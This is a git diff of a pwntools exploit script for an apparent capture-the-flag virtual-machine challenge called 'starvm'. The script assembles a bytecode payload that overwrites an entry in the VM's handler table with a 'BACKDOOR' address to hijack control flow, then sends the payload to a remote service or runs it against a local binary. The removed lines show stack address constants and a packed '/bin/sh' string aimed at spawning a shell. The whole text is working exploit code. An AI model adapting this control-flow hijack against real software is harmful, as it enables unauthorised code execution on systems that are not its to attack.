@@ -11,20 +11,10 @@ parser.add_argument("--remote", action="store_true", help="Connect to remote ser
 args = parser.parse_args()
 
 
-MAGIC_BEEF = 0xdeadbeefdeadbeef
-MAGIC_CAFE = 0xc00ffee0c00ffee0
-DUM_RBP = 0x7fffffffd8d0 
-DUM_RSP = 0x7ffffffd9eb0
 # these have fixed diff
 STORAGE_BASE = 0x7ffffffeaef0
-SOME_FLAG = STORAGE_BASE + 0x10028
 STACK_BASE   = STORAGE_BASE + 0x8000 + 0x1000 * 8
 HANDLER_TABLE_BASE = STACK_BASE + 0x6 * 8
-RET_ADDR = STORAGE_BASE - 69696
-RBP = STORAGE_BASE + 76256
-SOME_FLAG2 = RBP - 0x21a9
-SOME_FLAG3 = RBP - 0x29e0
-# construct /bin/perl /flag.txt
 
 def print_stack_length():
     # print stack length? 
@@ -221,13 +211,14 @@ def read_at(addr):
     b += read_from_storage()
     return b
 
+BACKDOOR = 0x102ee90
+
 program = b""
 # program += write_at(SOME_FLAG, 0x1)  # set flag to 1
 # program += write_at(SOME_FLAG2, 0x0)  # set flag2 to 0
 # program += write_at(SOME_FLAG3, 0x1)  # set flag3
-program += load_to_stack(0xdeadbeefdeadbeef)
-program += p8(0x61)
-
+program += write_at(HANDLER_TABLE_BASE + 8 * 2, BACKDOOR)  # set handler 2 to ret addr
+program += p8(0x2)
 len_main = 0x2000
 program = program.ljust(len_main, b'\x00')
 
@@ -243,12 +234,8 @@ with open('payload', 'wb') as f:
     f.write(p32(0))
 
     # storage
-    f.write(p32(2))
-    # put pointers in storage[0]
-    f.write(p64(0x7461632f6e69622f))  # "/bin/sh\x00"
-    f.write(p64(0x0000000000000000))  # filler
+    f.write(p32(0))
     
-
     # program
     f.write(p32(len_main))
     f.write(program) 
@@ -258,14 +245,12 @@ if args.run or args.delete:
     with open('payload', 'rb') as f:
         if args.run:
             if args.remote:
-                p = remote('localhost', 10302)
+                p = remote('10.113.0.1', 10302)
                 file_bytes = f.read()
                 p.sendlineafter(b'size > ', str(len(file_bytes)).encode())
                 print(f'sending {len(file_bytes)} bytes: {file_bytes}')
                 p.sendline(file_bytes)
-                REAL_RSP = int(p.recvlines(2)[1].decode()) 
-                print(f"REAL_RSP: {hex(REAL_RSP)}")
-                p.sendline(hex(REAL_RSP)[2:].encode())
+                print(p.readlines(2))
             else:
                 result = subprocess.run(["./starvm", f.name], capture_output=True)
                 print(f"output:\n{result.stdout.decode()}")
